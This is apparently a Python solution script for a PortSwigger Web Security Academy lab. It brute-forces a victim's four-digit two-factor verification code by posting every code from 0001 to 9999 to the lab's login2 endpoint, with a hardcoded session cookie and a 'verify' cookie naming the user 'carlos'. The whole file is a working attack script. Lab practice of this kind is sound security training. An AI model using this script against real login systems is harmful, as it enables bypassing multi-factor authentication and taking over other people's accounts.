# Lab8 from portswigger: Broken brute-force protection, IP block.
# This is a script for guessing the 2FA verification code for the victim.
import requests
from termcolor import colored

url = "https://0a37001804ac8a19c05bebc300550027.web-security-academy.net/login2" # Set the url.
  
def get_verification_code(username):
    for code in range(1,10000): # Try the possibilities from 0001 to 9999.
        cookies = {
            "session": "CfLu8can6VdMXQp2GYAuPH5VWvtV3Lr8", # Change it with your session value.
            "verify": username
            }
        data = {"mfa-code": f"{code:04d}"} # To make the digits format be a fixed length as 0001, 0002, 0003..etc.
        response = requests.post(url, cookies=cookies, data=data, allow_redirects=True)
        print(response.history) 

        #The password will be valid if the redirection happened at least one time in the "history" list.
        if (len(response.history) == 1):
            print(colored(f"[+] Valid verification code found... ","green"))
            return code
        else:
            print(colored(f"[!!] Incorrect verification code: {code:04d}\n","red"))    
                   
def main():
    username = "carlos"
    code = get_verification_code(username)
    print()
    print(colored(f"[+] Verifivation code: --> {code:04d}","green"))    

if __name__ == '__main__':
    main() 
